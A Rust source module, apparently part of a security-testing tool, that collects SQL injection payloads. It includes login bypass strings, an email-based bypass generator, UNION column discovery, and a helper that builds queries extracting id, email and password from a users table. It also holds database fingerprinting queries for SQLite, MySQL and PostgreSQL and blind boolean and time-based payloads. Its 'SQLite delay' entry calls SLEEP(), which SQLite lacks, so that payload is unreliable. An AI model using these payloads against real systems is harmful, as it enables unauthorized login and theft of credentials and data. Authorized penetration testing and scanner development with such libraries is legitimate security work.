//! SQL Injection payloads
//!
//! Provides payloads for various SQL injection techniques.

/// SQL Injection payload with metadata
#[derive(Debug, Clone)]
pub struct SqliPayload {
    /// Payload name
    pub name: String,
    /// The actual payload string
    pub payload: String,
    /// Target database type (if specific)
    pub db_type: Option<DbType>,
}

/// Database type for targeted payloads
#[derive(Debug, Clone, PartialEq)]
pub enum DbType {
    MySql,
    PostgreSql,
    Sqlite,
    MsSql,
    Oracle,
    Generic,
}

impl SqliPayload {
    /// Create a new generic SQLi payload
    pub fn new(name: &str, payload: &str) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            db_type: Some(DbType::Generic),
        }
    }

    /// Create a payload for a specific database
    pub fn for_db(name: &str, payload: &str, db_type: DbType) -> Self {
        Self {
            name: name.to_string(),
            payload: payload.to_string(),
            db_type: Some(db_type),
        }
    }
}

/// Authentication bypass payloads
pub fn auth_bypass_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new("OR 1=1", "' OR 1=1--"),
        SqliPayload::new("OR 1=1 (no quote)", "OR 1=1--"),
        SqliPayload::new("OR true", "' OR 'a'='a"),
        SqliPayload::new("Comment bypass", "admin'--"),
        SqliPayload::new("Double dash space", "' OR 1=1-- -"),
        SqliPayload::new("Hash comment", "' OR 1=1#"),
        SqliPayload::new("Null byte", "' OR 1=1%00"),
        SqliPayload::new("OR 1=1 close paren", "') OR 1=1--"),
        SqliPayload::new("OR 1=1 double paren", "')) OR 1=1--"),
        SqliPayload::new("Admin true", "admin' AND '1'='1"),
    ]
}

/// Generate login bypass for a specific email
pub fn email_bypass(email: &str) -> String {
    format!("{}'--", email)
}

/// UNION-based column discovery payloads
pub fn union_column_discovery(max_columns: usize) -> Vec<SqliPayload> {
    (1..=max_columns)
        .map(|n| {
            let columns = (1..=n).map(|i| i.to_string()).collect::<Vec<_>>().join(",");
            SqliPayload::new(
                &format!("{} columns", n),
                &format!("' UNION SELECT {}--", columns),
            )
        })
        .collect()
}

/// Generate UNION SELECT payload for extracting data
pub fn union_extract(columns: &[&str], table: &str, total_columns: usize) -> String {
    let mut select_parts: Vec<String> = (1..=total_columns).map(|i| i.to_string()).collect();

    for (i, col) in columns.iter().enumerate() {
        if i < select_parts.len() {
            select_parts[i] = (*col).to_string();
        }
    }

    format!(
        "')) UNION SELECT {} FROM {}--",
        select_parts.join(","),
        table
    )
}

/// SQLite-specific payloads
pub fn sqlite_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::for_db(
            "SQLite version",
            "' UNION SELECT sqlite_version()--",
            DbType::Sqlite,
        ),
        SqliPayload::for_db(
            "SQLite tables",
            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
            DbType::Sqlite,
        ),
        SqliPayload::for_db(
            "SQLite schema",
            "' UNION SELECT sql FROM sqlite_master--",
            DbType::Sqlite,
        ),
    ]
}

/// MySQL-specific payloads
pub fn mysql_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::for_db("MySQL version", "' UNION SELECT @@version--", DbType::MySql),
        SqliPayload::for_db("MySQL user", "' UNION SELECT user()--", DbType::MySql),
        SqliPayload::for_db(
            "MySQL databases",
            "' UNION SELECT schema_name FROM information_schema.schemata--",
            DbType::MySql,
        ),
        SqliPayload::for_db(
            "MySQL tables",
            "' UNION SELECT table_name FROM information_schema.tables--",
            DbType::MySql,
        ),
    ]
}

/// PostgreSQL-specific payloads
pub fn postgresql_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::for_db(
            "PostgreSQL version",
            "' UNION SELECT version()--",
            DbType::PostgreSql,
        ),
        SqliPayload::for_db(
            "PostgreSQL user",
            "' UNION SELECT current_user--",
            DbType::PostgreSql,
        ),
        SqliPayload::for_db(
            "PostgreSQL tables",
            "' UNION SELECT tablename FROM pg_tables--",
            DbType::PostgreSql,
        ),
    ]
}

/// Boolean-based blind SQLi payloads
pub fn blind_boolean_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::new("True condition", "' AND 1=1--"),
        SqliPayload::new("False condition", "' AND 1=2--"),
        SqliPayload::new("Substring test", "' AND SUBSTRING(username,1,1)='a'--"),
    ]
}

/// Time-based blind SQLi payloads
pub fn blind_time_payloads() -> Vec<SqliPayload> {
    vec![
        SqliPayload::for_db("MySQL sleep", "' AND SLEEP(5)--", DbType::MySql),
        SqliPayload::for_db(
            "PostgreSQL sleep",
            "'; SELECT pg_sleep(5)--",
            DbType::PostgreSql,
        ),
        SqliPayload::for_db(
            "SQLite delay",
            "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM (SELECT SLEEP(5))a) END)--",
            DbType::Sqlite,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_auth_bypass_payloads() {
        let payloads = auth_bypass_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.payload.contains("OR 1=1")));
    }

    #[test]
    fn test_email_bypass() {
        let payload = email_bypass("admin@example.com");
        assert_eq!(payload, "admin@example.com'--");
    }

    #[test]
    fn test_union_column_discovery() {
        let payloads = union_column_discovery(5);
        assert_eq!(payloads.len(), 5);
        assert!(payloads[0].payload.contains("UNION SELECT 1"));
        assert!(payloads[4].payload.contains("1,2,3,4,5"));
    }

    #[test]
    fn test_union_extract() {
        let payload = union_extract(&["id", "email", "password"], "users", 9);
        assert!(payload.contains("id,email,password"));
        assert!(payload.contains("FROM users"));
    }
}
